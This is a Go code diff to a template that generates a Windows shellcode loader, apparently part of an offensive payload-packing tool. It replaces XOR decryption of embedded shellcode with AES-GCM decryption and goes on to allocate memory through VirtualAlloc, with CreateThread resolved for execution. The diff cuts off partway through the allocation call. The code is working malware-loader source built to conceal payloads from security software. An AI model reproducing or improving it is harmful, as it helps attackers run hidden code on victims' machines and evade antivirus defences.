@@ -1,12 +1,15 @@
 package templates
 
-var XorTmpl = `
+var AesTmpl = `
 package main
 
 import (
 	"fmt"
 	"syscall"
 	"unsafe"
+	"crypto/aes"
+	"crypto/cipher"
+	"errors"
 
 	"golang.org/x/sys/windows"
 )
@@ -26,14 +29,27 @@ var (
 	CreateThread  = kernel32.MustFindProc("CreateThread")
 )
 
-func decrypt(shellcode []byte, key string) []byte {
-	keyBytes := []byte(key)
-	keyLen := len(keyBytes)
+var ErrCipherTextTooShort = errors.New("ciphertext too short")
 
-	for i := 0; i < len(shellcode); i++ {
-		shellcode[i] ^= keyBytes[i%keyLen]
+func decrypt(content, key []byte) ([]byte, error) {
+	c, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
 	}
-	return shellcode
+
+	gcm, err := cipher.NewGCM(c)
+	if err != nil {
+		return nil, err
+	}
+
+	nonceSize := gcm.NonceSize()
+	if len(content) < nonceSize {
+		return nil, ErrCipherTextTooShort
+	}
+
+	nonce, ciphertext := content[:nonceSize], content[nonceSize:]
+
+	return gcm.Open(nil, nonce, ciphertext, nil)
 }
 
 func main() {
@@ -46,7 +62,12 @@ func main() {
 	}
 
 	var shellcode []byte
-	shellcode = decrypt(shellcodeBytes, key)
+	shellcode, err := decrypt(shellcodeBytes, []byte(key))
+	if err != nil {
+		fmt.Println("failed to decrypt payload")
+		fmt.Println(err)
+		syscall.Exit(0)	
+	}
 
 	addr, _, err := VirtualAlloc.Call(
 		0,
